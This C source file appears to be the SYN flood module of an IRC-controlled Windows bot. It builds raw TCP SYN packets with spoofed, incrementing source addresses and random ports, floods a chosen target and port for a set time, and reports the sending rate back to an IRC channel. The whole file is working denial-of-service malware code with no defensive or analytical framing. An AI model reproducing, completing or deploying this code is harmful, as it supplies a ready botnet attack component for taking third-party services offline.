#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_SYN

DWORD WINAPI SynFloodThread(LPVOID param)
{
	char sendbuf[IRCLINE];

	SYNFLOOD synflood = *((SYNFLOOD *)param);
	SYNFLOOD *synfloods = (SYNFLOOD *)param;
	synfloods->gotinfo = TRUE;

	sprintf(sendbuf, "s[I] (syn.plg) »»  Done with flood (%iKB/sec).", SynFlood(synflood.ip, synflood.port, synflood.length));
	if (!synflood.silent) irc_privmsg(synflood.sock, synflood.chan, sendbuf, synflood.notice);
	addlog(sendbuf);

	clearthread(synflood.threadnum);

	ExitThread(0);
}

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort, int len)
{
	IPHEADER ipHeader;
	TCPHEADER tcpHeader;
	PSDHEADER psdHeader;

	LARGE_INTEGER freq, halt_time, cur;
	char szSendBuf[60]={0},buf[64];
	int rect;

	WSADATA WSAData;
	if (fWSAStartup(MAKEWORD(2,2), &WSAData) != 0)
		return FALSE;

	SOCKET sock;
	if ((sock = fWSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) {
		fWSACleanup();
		return FALSE;
	}

	BOOL flag=TRUE;
	if (fsetsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
		fclosesocket(sock);
		fWSACleanup();
		return FALSE;
	}

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET;
	ssin.sin_port=fhtons(TargetPort);
	ssin.sin_addr.s_addr=TargetIP;

	ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=fhtons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP;
	ipHeader.checksum=0;
	ipHeader.destIP=TargetIP;

	tcpHeader.dport=fhtons(TargetPort);
	tcpHeader.ack_seq=0;
	tcpHeader.lenres=(sizeof(tcpHeader)/4<<4|0);
	tcpHeader.flags=2;
	tcpHeader.window=fhtons(16384);
	tcpHeader.urg_ptr=0;

	long total = 0;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&cur);
	halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;

	while (1) {
		tcpHeader.checksum=0;
		tcpHeader.sport=fhtons((unsigned short)((rand() % 1001) + 1000));
		tcpHeader.seq=fhtons((unsigned short)((rand() << 16) | rand()));

		ipHeader.sourceIP=fhtonl(SpoofingIP++);

		psdHeader.daddr=ipHeader.destIP;
		psdHeader.zero=0;
		psdHeader.proto=IPPROTO_TCP;
		psdHeader.length=fhtons(sizeof(tcpHeader));
		psdHeader.saddr=ipHeader.sourceIP;
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));

		tcpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		rect=fsendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&ssin, sizeof(ssin));
		if (rect==SOCKET_ERROR) {
			sprintf(buf, "s[I] (syn.plg) »»  Send error: <%d>.",fWSAGetLastError());
			addlog(buf);

			fclosesocket(sock);
			fWSACleanup();
			return 0;
		}

		total += rect;
		QueryPerformanceCounter(&cur);
		if (cur.QuadPart >= halt_time.QuadPart)
			break;
	}

	fclosesocket(sock);
	fWSACleanup();

	return (total);
}

long SynFlood(char *target, char *port, char *len)
{
	unsigned long TargetIP = ResolveAddress(target);
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);
	unsigned int SpoofIP = TargetIP + ((rand()%512)+256);

	long num = SendSyn(TargetIP, SpoofIP, p, t);

	if (num == 0)
		num = 1;
	num = num / 1000 / t;

	return num;
}
#endif
